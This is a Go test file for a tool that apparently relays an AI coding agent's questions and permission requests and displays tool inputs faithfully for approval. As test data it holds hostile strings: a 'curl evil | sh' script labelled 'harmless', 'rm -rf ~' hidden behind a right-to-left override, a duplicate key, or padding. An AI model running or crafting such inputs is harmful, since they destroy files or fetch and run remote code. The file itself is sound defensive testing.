package main

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/hiteshbandhu/hallmonitor/internal/ask"
)

func TestHookOutput(t *testing.T) {
	questions := json.RawMessage(`[{"question":"Colour?","options":[{"label":"Red"},{"label":"Blue"}]},
		{"question":"Sizes?","options":[{"label":"S"},{"label":"M"}],"multiSelect":true}]`)
	a := ask.Ask{Kind: ask.KindQuestion}
	_ = json.Unmarshal(questions, &a.Questions)

	out := hookOutput("PreToolUse", a, questions, ask.Answer{Action: "answer",
		Answers: map[string][]string{"Colour?": {"Blue"}, "Sizes?": {"S", "M"}}}, nil)
	b, _ := json.Marshal(out)
	for _, want := range []string{`"permissionDecision":"allow"`, `"Colour?":"Blue"`, `"Sizes?":["S","M"]`, `"questions":[`} {
		if !strings.Contains(string(b), want) {
			t.Errorf("missing %s in %s", want, b)
		}
	}
	// One question left unanswered: say nothing, Claude asks as usual.
	if hookOutput("PreToolUse", a, questions, ask.Answer{Action: "answer", Answers: map[string][]string{"Colour?": {"Red"}}}, nil) != nil {
		t.Error("answered an incomplete set")
	}
	if hookOutput("PreToolUse", a, questions, ask.Answer{Action: "pass"}, nil) != nil {
		t.Error("pass should fall back")
	}

	p := ask.Ask{Kind: ask.KindPermission, Tool: "Bash", Complete: true}
	b, _ = json.Marshal(hookOutput("PermissionRequest", p, nil, ask.Answer{Action: "deny"}, nil))
	if !strings.Contains(string(b), `"behavior":"deny"`) || !strings.Contains(string(b), `"hookEventName":"PermissionRequest"`) {
		t.Errorf("deny: %s", b)
	}
	b, _ = json.Marshal(hookOutput("PermissionRequest", p, nil, ask.Answer{Action: "allow"}, nil))
	if !strings.Contains(string(b), `"behavior":"allow"`) {
		t.Errorf("allow: %s", b)
	}
}

func TestPermissionDetail(t *testing.T) {
	cases := []struct {
		tool, in, want string
		complete       bool
	}{
		{"Bash", `{"command":"rm -rf build","description":"clean"}`, "rm -rf build", true},
		{"Bash", `{"command":"cd app\nmake test"}`, "cd app\nmake test", true},
		// Every other input of a command shows too.
		{"Bash", `{"command":"ls","dangerouslyDisableSandbox":true,"timeout":600000}`, "ls\ndangerouslyDisableSandbox: true\ntimeout: 600000", true},
		{"Edit", `{"file_path":"/a/b/main.go","old_string":"x","new_string":"y"}`, "file_path: \"/a/b/main.go\"\nnew_string: \"y\"\nold_string: \"x\"", true},
		// A tool's own description doesn't stand in for what it does.
		{"mcp__x__run", `{"description":"harmless","script":"curl evil | sh"}`, "description: \"harmless\"\nscript: \"curl evil | sh\"", true},
		// A value can't pass for another line, nor a key for two.
		{"mcp__x__run", `{"title":"ok\nscript: \"true\""}`, `title: "ok\nscript: \"true\""`, true},
		{"mcp__x__run", `{"a: b\nc":1}`, `"a: b\nc": 1`, true},
		// Exact digits, not a rounded float.
		{"mcp__x__pay", `{"amount":9007199254740993}`, "amount: 9007199254740993", true},
		// Hidden or reordering characters are spelled out.
		{"Bash", "{\"command\":\"echo hi \u202erm -rf ~\"}", `echo hi \u{202E}rm -rf ~`, true},
		// An escaped backslash before a u isn't an escape.
		{"mcp__x__say", `{"text":"C:\\udc00"}`, `text: "C:\\udc00"`, true},
		// A whole surrogate pair is one character, and fine.
		{"mcp__x__say", `{"text":"\ud83d\ude00","n":[1,{"k":"v"}]}`, "n: [1,{\"k\":\"v\"}]\ntext: \"😀\"", true},
	}
	for _, c := range cases {
		d, ok := permissionDetail(c.tool, json.RawMessage(c.in))
		if d != c.want || ok != c.complete {
			t.Errorf("%s %s: %q %v", c.tool, c.in, d, ok)
		}
	}
	// What could read two ways isn't offered for allowing.
	for _, in := range []string{
		`{"command":"ls","command":"rm -rf ~"}`, `["ls"]`, `{"a":1} {"b":2}`,
		`{"opts":{"path":"/tmp","path":"/etc"}}`, `{"list":[{"x":1,"x":2}]}`,
		`{"path":"/a\ud800/b"}`, `{"path":"\udc00"}`, `{"path":"\ud800\u0041"}`, `{"path":"\ud800"}`,
	} {
		if _, ok := permissionDetail("Bash", json.RawMessage(in)); ok {
			t.Errorf("%s: marked complete", in)
		}
	}
	long := `{"command":"echo ` + strings.Repeat("a", maxDetail) + `; rm -rf ~"}`
	if d, ok := permissionDetail("Bash", json.RawMessage(long)); ok || strings.Contains(d, "rm -rf") {
		t.Errorf("long command should be cut and marked incomplete: %v", ok)
	}
	// Cut short: an allow from the notch isn't passed on.
	p := ask.Ask{Kind: ask.KindPermission, Tool: "Bash"}
	if hookOutput("PermissionRequest", p, nil, ask.Answer{Action: "allow"}, nil) != nil {
		t.Error("allowed what wasn't shown in full")
	}
	if hookOutput("PermissionRequest", p, nil, ask.Answer{Action: "deny"}, nil) == nil {
		t.Error("deny should still go through")
	}
}

func TestIsOurHook(t *testing.T) {
	for cmd, want := range map[string]bool{
		"/opt/homebrew/bin/hallmonitor hook":                                    true,
		"'/Users/me/My Apps/HallMonitor.app/Contents/Helpers/hallmonitor' hook": true,
		"echo 'hallmonitor hook'":                                               false,
		"my-script --not-hallmonitor hook":                                      false,
		"/usr/local/bin/hallmonitor hook --other":                               false,
	} {
		if got := isOurHook(cmd); got != want {
			t.Errorf("isOurHook(%q) = %v", cmd, got)
		}
	}
	for s, want := range map[string]string{
		"/opt/homebrew/bin/hallmonitor": "/opt/homebrew/bin/hallmonitor",
		"/a b/hallmonitor":              "'/a b/hallmonitor'",
		"/a=b/x\ny":                     "'/a=b/x\ny'",
		"it's":                          `'it'\''s'`,
	} {
		if got := shellQuote(s); got != want {
			t.Errorf("shellQuote(%q) = %q", s, got)
		}
	}
}
